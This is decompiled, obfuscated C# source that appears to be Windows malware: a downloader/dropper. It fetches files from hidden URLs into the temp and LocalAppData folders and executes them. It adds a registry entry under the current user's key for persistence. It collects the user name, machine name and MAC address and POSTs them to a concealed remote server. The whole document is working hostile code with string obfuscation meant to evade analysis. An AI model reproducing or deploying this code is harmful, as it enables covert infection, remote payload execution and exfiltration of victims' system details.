using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using Microsoft.Win32;

internal class z
{
	private static string m_a;

	private static string m_b;

	private static string c;

	private static string d;

	private static string e;

	private static string f;

	private static string g;

	private unsafe static void a(string[] args)
	{
		_003CModule_003E.r = new byte[100];
		((sbyte[])_003CModule_003E.r)[0] = -69;
		((sbyte[])_003CModule_003E.r)[1] = -72;
		((sbyte[])_003CModule_003E.r)[2] = 16;
		((sbyte[])_003CModule_003E.r)[3] = 122;
		((sbyte[])_003CModule_003E.r)[4] = 19;
		((sbyte[])_003CModule_003E.r)[5] = -57;
		((sbyte[])_003CModule_003E.r)[6] = -83;
		((sbyte[])_003CModule_003E.r)[7] = -43;
		((sbyte[])_003CModule_003E.r)[8] = 99;
		((sbyte[])_003CModule_003E.r)[9] = 75;
		((sbyte[])_003CModule_003E.r)[10] = -29;
		((sbyte[])_003CModule_003E.r)[11] = -75;
		((sbyte[])_003CModule_003E.r)[12] = -74;
		((sbyte[])_003CModule_003E.r)[13] = -30;
		((sbyte[])_003CModule_003E.r)[14] = 17;
		((sbyte[])_003CModule_003E.r)[15] = 81;
		((sbyte[])_003CModule_003E.r)[16] = -77;
		((sbyte[])_003CModule_003E.r)[17] = 3;
		((sbyte[])_003CModule_003E.r)[18] = -112;
		((sbyte[])_003CModule_003E.r)[19] = 125;
		((sbyte[])_003CModule_003E.r)[20] = 63;
		((sbyte[])_003CModule_003E.r)[21] = -85;
		((sbyte[])_003CModule_003E.r)[22] = -29;
		((sbyte[])_003CModule_003E.r)[23] = -53;
		((sbyte[])_003CModule_003E.r)[24] = -48;
		((sbyte[])_003CModule_003E.r)[25] = 20;
		((sbyte[])_003CModule_003E.r)[26] = -93;
		((sbyte[])_003CModule_003E.r)[27] = -23;
		((sbyte[])_003CModule_003E.r)[28] = 31;
		((sbyte[])_003CModule_003E.r)[29] = 46;
		((sbyte[])_003CModule_003E.r)[30] = -19;
		((sbyte[])_003CModule_003E.r)[31] = 100;
		((sbyte[])_003CModule_003E.r)[32] = 64;
		((sbyte[])_003CModule_003E.r)[33] = 0;
		((sbyte[])_003CModule_003E.r)[34] = 0;
		((sbyte[])_003CModule_003E.r)[35] = 0;
		((sbyte[])_003CModule_003E.r)[36] = -105;
		((sbyte[])_003CModule_003E.r)[37] = 33;
		((sbyte[])_003CModule_003E.r)[38] = 126;
		((sbyte[])_003CModule_003E.r)[39] = 6;
		((sbyte[])_003CModule_003E.r)[40] = 3;
		((sbyte[])_003CModule_003E.r)[41] = 61;
		((sbyte[])_003CModule_003E.r)[42] = -15;
		((sbyte[])_003CModule_003E.r)[43] = 21;
		((sbyte[])_003CModule_003E.r)[44] = -20;
		((sbyte[])_003CModule_003E.r)[45] = 17;
		((sbyte[])_003CModule_003E.r)[46] = 65;
		((sbyte[])_003CModule_003E.r)[47] = -15;
		((sbyte[])_003CModule_003E.r)[48] = -65;
		((sbyte[])_003CModule_003E.r)[49] = 37;
		((sbyte[])_003CModule_003E.r)[50] = -54;
		((sbyte[])_003CModule_003E.r)[51] = 53;
		((sbyte[])_003CModule_003E.r)[52] = -9;
		((sbyte[])_003CModule_003E.r)[53] = -7;
		((sbyte[])_003CModule_003E.r)[54] = -28;
		((sbyte[])_003CModule_003E.r)[55] = 51;
		((sbyte[])_003CModule_003E.r)[56] = -2;
		((sbyte[])_003CModule_003E.r)[57] = 101;
		((sbyte[])_003CModule_003E.r)[58] = -83;
		((sbyte[])_003CModule_003E.r)[59] = -120;
		((sbyte[])_003CModule_003E.r)[60] = 94;
		((sbyte[])_003CModule_003E.r)[61] = 39;
		((sbyte[])_003CModule_003E.r)[62] = -115;
		((sbyte[])_003CModule_003E.r)[63] = -124;
		((sbyte[])_003CModule_003E.r)[64] = -121;
		((sbyte[])_003CModule_003E.r)[65] = 116;
		((sbyte[])_003CModule_003E.r)[66] = -114;
		((sbyte[])_003CModule_003E.r)[67] = 122;
		((sbyte[])_003CModule_003E.r)[68] = -70;
		((sbyte[])_003CModule_003E.r)[69] = -79;
		((sbyte[])_003CModule_003E.r)[70] = 121;
		((sbyte[])_003CModule_003E.r)[71] = 91;
		((sbyte[])_003CModule_003E.r)[72] = -56;
		((sbyte[])_003CModule_003E.r)[73] = 11;
		((sbyte[])_003CModule_003E.r)[74] = -99;
		((sbyte[])_003CModule_003E.r)[75] = 112;
		((sbyte[])_003CModule_003E.r)[76] = 35;
		((sbyte[])_003CModule_003E.r)[77] = 53;
		((sbyte[])_003CModule_003E.r)[78] = 115;
		((sbyte[])_003CModule_003E.r)[79] = -3;
		((sbyte[])_003CModule_003E.r)[80] = 122;
		((sbyte[])_003CModule_003E.r)[81] = -26;
		((sbyte[])_003CModule_003E.r)[82] = 49;
		((sbyte[])_003CModule_003E.r)[83] = 39;
		((sbyte[])_003CModule_003E.r)[84] = 27;
		((sbyte[])_003CModule_003E.r)[85] = -107;
		((sbyte[])_003CModule_003E.r)[86] = -55;
		((sbyte[])_003CModule_003E.r)[87] = 74;
		((sbyte[])_003CModule_003E.r)[88] = -76;
		((sbyte[])_003CModule_003E.r)[89] = 3;
		((sbyte[])_003CModule_003E.r)[90] = 33;
		((sbyte[])_003CModule_003E.r)[91] = -126;
		((sbyte[])_003CModule_003E.r)[92] = -120;
		((sbyte[])_003CModule_003E.r)[93] = -81;
		((sbyte[])_003CModule_003E.r)[94] = -80;
		((sbyte[])_003CModule_003E.r)[95] = 74;
		((sbyte[])_003CModule_003E.r)[96] = 111;
		((sbyte[])_003CModule_003E.r)[97] = 9;
		((sbyte[])_003CModule_003E.r)[98] = -68;
		((sbyte[])_003CModule_003E.r)[99] = -50;
		b(Path.GetTempPath() + z.m_b, z.m_a);
		b(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 15388), (int)((nint)Type.EmptyTypes.LongLength + 16312), sizeof(ulong) + 133) + e, d);
		RegistryKey currentUser = Registry.CurrentUser;
		nint num = (nint)Type.EmptyTypes.LongLength + 49174;
		int num2 = aa.c;
		RegistryKey registryKey = currentUser.CreateSubKey(_003CModule_003E.c(48255, (int)num, (int)(((0x1900 & ((uint)num2 / 67108864u)) == 0) ? 15 : ((~(-(num2 * -1503395840)) == 262144 * num2) ? ((nint)Type.EmptyTypes.LongLength + -1850472152) : ((nint)Type.EmptyTypes.LongLength + 369414464)))));
		try
		{
			string text = e;
			nint intPtr = ((((uint)((-118259712 * num2) & num2) >> 2) - 21976 != (uint)(num2 * 2084569088)) ? ((nint)Type.EmptyTypes.LongLength + 58975) : (sizeof(uint) + -1560472947));
			int o = default(int);
			nint num3;
			if (num2 - 9293 - 6327 != -353354551 + (num2 & 0x240D))
			{
				o = _003CModule_003E.o;
				num3 = ((-(180912128 * num2) == 6299) ? (sizeof(ushort) + -1156773678) : ((nint)Type.EmptyTypes.LongLength + 59857));
			}
			else
			{
				num3 = (nint)Type.EmptyTypes.LongLength + -1939123633;
			}
			registryKey.SetValue(text.Replace(_003CModule_003E.c((int)intPtr, (int)num3, (int)((nint)Type.EmptyTypes.LongLength + 97)), _003CModule_003E.c(sizeof(long) + 6911, 7764, (int)((nint)Type.EmptyTypes.LongLength + 235))), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 27971), (int)(((0x5D3B0000 & o) == (0x5D3B0000 & o)) ? ((nint)Type.EmptyTypes.LongLength + 28995) : ((nint)Type.EmptyTypes.LongLength + -1969371977)), sizeof(double) + 12) + e);
			registryKey.Close();
		}
		catch
		{
		}
		a(f, g);
	}

	private unsafe static string a(string string_0, string string_1)
	{
		WebRequest webRequest = WebRequest.Create(string_0);
		int p = _003CModule_003E.p;
		webRequest.Method = _003CModule_003E.c(((p & 0x6D6) * ((0x1B8E & p) << 28) == -8552) ? 2102458327 : 26028, sizeof(ushort) + 26819, (int)((nint)Type.EmptyTypes.LongLength + 206));
		webRequest.Timeout = 100000;
		webRequest.ContentType = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 49334), (int)((nint)Type.EmptyTypes.LongLength + 50416), (int)((nint)Type.EmptyTypes.LongLength + 178));
		byte[] bytes = Encoding.GetEncoding(1251).GetBytes(string_1);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		return null;
	}

	private unsafe static string a()
	{
		aa.e = 0;
		_003CModule_003E.o = -901103418;
		_003CModule_003E.o = 0;
		_003CModule_003E.j = null;
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = string.Empty;
		aa.c = 1209922120;
		_003CModule_003E.l = -2070487512;
		NetworkInterface[] array = allNetworkInterfaces;
		int num = 0;
		_003CModule_003E.c = null;
		IPInterfaceProperties iPInterfaceProperties = default(IPInterfaceProperties);
		_003CModule_003E.g = iPInterfaceProperties;
		_003CModule_003E.p = -1972603927;
		_003CModule_003E.d = array;
		bool flag = default(bool);
		NetworkInterface networkInterface = default(NetworkInterface);
		while (true)
		{
			int num2 = num;
			int num3 = array.Length;
			_003CModule_003E.i = flag;
			_003CModule_003E.m = 1476818249;
			if (!(flag = num2 < num3))
			{
				break;
			}
			_003CModule_003E.d = null;
			_003CModule_003E.i = null;
			int num4 = num;
			_003CModule_003E.f = networkInterface;
			_003CModule_003E.q = 1686037849;
			networkInterface = array[num4];
			_003CModule_003E.n = -1078885842;
			if (!(flag = !(text == string.Empty)))
			{
				NetworkInterface networkInterface2 = networkInterface;
				_003CModule_003E.k = num;
				IPInterfaceProperties iPProperties = networkInterface2.GetIPProperties();
				_003CModule_003E.n = 536060152;
				_003CModule_003E.q = 2093345790;
				iPInterfaceProperties = iPProperties;
				text = networkInterface.GetPhysicalAddress().ToString();
			}
			int num5 = num;
			aa.e = 1236562884;
			int num6 = num5 + 1;
			_003CModule_003E.m = -1326874900;
			int int_ = sizeof(long) + 19960;
			int p = _003CModule_003E.p;
			nint num7;
			if ((0xD51u ^ (uint)(1048576 * p + 8510)) != 0)
			{
				int l = _003CModule_003E.l;
				num7 = ((((uint)(17 * l + l * 111) ^ 0xD89u) != 0) ? (sizeof(ushort) + 21045) : ((nint)Type.EmptyTypes.LongLength + -1912651293));
			}
			else
			{
				num7 = (nint)Type.EmptyTypes.LongLength + 1624744994;
			}
			_003CModule_003E.d = _003CModule_003E.c(int_, (int)num7, (int)((nint)Type.EmptyTypes.LongLength + 175));
			num = num6;
		}
		return text;
	}

	private unsafe static string b(string string_0, string string_1)
	{
		string h = _003CModule_003E.c(sizeof(double) + 34127, sizeof(ulong) + 34995, sizeof(double) + 10);
		aa.e = -1758776640;
		_003CModule_003E.h = h;
		string text = default(string);
		_003CModule_003E.e = text;
		WebClient webClient = new WebClient();
		Uri address = new Uri(string_1);
		_003CModule_003E.p = -1797717383;
		aa.d = 478672227;
		_003CModule_003E.h = false;
		webClient.DownloadFileAsync(address, string_0);
		Process process = new Process();
		ProcessStartInfo startInfo = process.StartInfo;
		int int_ = sizeof(byte) + 17108;
		int l = _003CModule_003E.l;
		_003CModule_003E.i = _003CModule_003E.c(int_, ((uint)l / 1024u != 2615285276u) ? (sizeof(short) + 18206) : (-1669829832), 135);
		startInfo.FileName = string_0;
		while (true)
		{
			bool flag = new FileInfo(string_0).Length == 0L;
			_003CModule_003E.k = -425994790;
			_003CModule_003E.c = null;
			_003CModule_003E.a = -1483205567;
			if (!flag)
			{
				break;
			}
			_003CModule_003E.q = -629041435;
			Thread.Sleep(500);
		}
		_003CModule_003E.f = null;
		Thread.Sleep(5000);
		try
		{
			process.Start();
		}
		catch
		{
			_003CModule_003E.d = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 41707), sizeof(short) + 42363, (int)((nint)Type.EmptyTypes.LongLength + 195));
			_003CModule_003E.q = 1772982142;
		}
		text = null;
		string result = text;
		_003CModule_003E.g = process;
		return result;
	}

	unsafe static z()
	{
		int n = _003CModule_003E.n;
		z.m_a = _003CModule_003E.c((int)(((n & 4) == (int)(((uint)(556924928 * n) >> 17) & 4)) ? ((nint)Type.EmptyTypes.LongLength + 56157) : ((32 * n * 67108864 - 1073741824 != (int)(((uint)n / 137u) | 0x98B)) ? (-1606433827) : (((((n * 5 + 3 * n) ^ (-8192 & n)) & 4) == (((n + n * 3) * 4) & 4)) ? ((nint)Type.EmptyTypes.LongLength + 1611485862) : ((nint)Type.EmptyTypes.LongLength + 736904079)))), sizeof(short) + 56784, (int)((nint)Type.EmptyTypes.LongLength + 82));
		z.m_b = _003CModule_003E.c(2110, (int)((nint)Type.EmptyTypes.LongLength + 3350), (int)((-268435456 * (n & 0x1872) * (n * 88 + 40 * n) >= 0) ? ((nint)Type.EmptyTypes.LongLength + 53) : ((((-n ^ (n - 4234)) & 1) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1643436174) : ((~((uint)n / 122u) == 8368) ? ((nint)Type.EmptyTypes.LongLength + -1944890130) : (sizeof(uint) + -1788350793)))));
		string text = _003CModule_003E.c((int)(((0xA0000000u & ((uint)n / 8u)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 51565) : (sizeof(byte) + 2089004716)), (int)((nint)Type.EmptyTypes.LongLength + 52268), sizeof(double) + 104);
		string[] array = default(string[]);
		_003CModule_003E.d = array;
		string[] h = array;
		aa.e = 1963656457;
		_003CModule_003E.h = h;
		_003CModule_003E.a = null;
		c = text;
		string text2 = c;
		string text3 = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 68350), (int)((nint)Type.EmptyTypes.LongLength + 68992), (int)((nint)Type.EmptyTypes.LongLength + 48));
		aa.c = 399340914;
		d = text2 + text3;
		e = _003CModule_003E.c((int)(((((n << 15) - -8813) | -6365) == -6289) ? ((nint)Type.EmptyTypes.LongLength + 11675) : ((nint)Type.EmptyTypes.LongLength + 1883410728)), sizeof(short) + 12226, sizeof(short) + 210);
		string text4 = c;
		nint num = (nint)Type.EmptyTypes.LongLength + 67166;
		int q = default(int);
		nint num2;
		int n2 = default(int);
		int o = default(int);
		if (~((uint)(n * 165 + n * 1883) >> 11) == (uint)n)
		{
			if (-1744830464 + -q * 134217728 == q << 27)
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 584739469;
			}
			else
			{
				n2 = _003CModule_003E.n;
				if ((n2 << 9) - 202688 == q * 128)
				{
					num2 = -1304952677;
				}
				else if ((-2779 | (4194304 * q)) != -2779)
				{
					int n3 = _003CModule_003E.n;
					if (-28389376 + (n3 << 12) == n3 * -9375744)
					{
						num2 = ((n2 * 7 + 25 * n2 - 8868864 != (n2 | -3047) * 32) ? ((nint)Type.EmptyTypes.LongLength + -1390417526) : (sizeof(Guid) + -1869600232));
					}
					else if (8686 + n - 6555 == (int)((uint)(0x1921 ^ (n + n)) >> 1))
					{
						if (-2500 + n2 - 2235 == -n2)
						{
							num2 = 2031576997;
						}
						else
						{
							o = _003CModule_003E.o;
							num2 = (((1 & (((int)(0xF1DE1D3Fu | ((uint)o >> 5)) + o) ^ o)) == 1) ? (sizeof(double) + -1397890079) : ((nint)Type.EmptyTypes.LongLength + 1021211034));
						}
					}
					else
					{
						num2 = (nint)Type.EmptyTypes.LongLength + -1026273276;
					}
				}
				else
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 1057127880;
				}
			}
		}
		else
		{
			q = _003CModule_003E.q;
			num2 = (((0x48000000 & (4 * q + 28 * q)) != (0x48000000 & (q + q * 3 << 3))) ? ((nint)Type.EmptyTypes.LongLength + 1107788826) : 180);
		}
		string text5 = text4 + _003CModule_003E.c(66130, (int)num, (int)num2);
		int num3 = 11779;
		_003CModule_003E.b = _003CModule_003E.c(11042, 11779, (int)((n2 * 131072 + 13762560 != n2 * 941490176) ? ((nint)Type.EmptyTypes.LongLength + 82) : (((-1713953234 ^ (7089 + (o & (o << 20)))) == 1965) ? ((nint)Type.EmptyTypes.LongLength + 1937298726) : (sizeof(short) + -1573263842))));
		_003CModule_003E.h = 1573355322;
		f = text5;
		_003CModule_003E.c = array;
		array = new string[7];
		string[] array2 = array;
		string text6 = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 56887), 58041, (int)((nint)Type.EmptyTypes.LongLength + 109));
		_003CModule_003E.l = 1844178407;
		array2[0] = text6;
		array[1] = Environment.UserName;
		_003CModule_003E.l = -1322897106;
		string[] array3 = array;
		string text7 = _003CModule_003E.c((int)(((((uint)q / 262144u) & (uint)(q * 490 + 1558 * q)) != 3936291673u) ? ((nint)Type.EmptyTypes.LongLength + 54365) : (sizeof(byte) + -871708589)), sizeof(double) + 54770, (int)((nint)Type.EmptyTypes.LongLength + 170));
		_003CModule_003E.c = array;
		array3[2] = text7;
		array[3] = Environment.MachineName;
		_003CModule_003E.n = -1517755677;
		_003CModule_003E.c = null;
		string[] array4 = array;
		_003CModule_003E.d = null;
		string text8 = _003CModule_003E.c((int)(((0x86B & (n2 * -1191182336 - 9217)) != 2155) ? (sizeof(byte) + -1896131320) : ((nint)Type.EmptyTypes.LongLength + 23218)), sizeof(byte) + 24681, ((uint)num3 % 1708u != 1721556701) ? 126 : (sizeof(uint) + -1196715823));
		_003CModule_003E.o = -1441989929;
		array4[4] = text8;
		string[] array5 = array;
		string text9 = a();
		_003CModule_003E.k = 1684875021;
		_003CModule_003E.o = 318430428;
		array5[5] = text9;
		string[] array6 = array;
		_003CModule_003E.b = array;
		array6[6] = _003CModule_003E.c(56614, (int)((nint)Type.EmptyTypes.LongLength + 56971), (int)((nint)Type.EmptyTypes.LongLength + 185));
		string[] array7 = array;
		aa.c = -1229235034;
		aa.c = -773766295;
		int int_ = 42460;
		string text10 = _003CModule_003E.c(int_, (int)((nint)Type.EmptyTypes.LongLength + 43978), sizeof(float) + 112);
		_003CModule_003E.e = 1275435636;
		_003CModule_003E.e = text10;
		g = string.Concat(array7);
	}
}
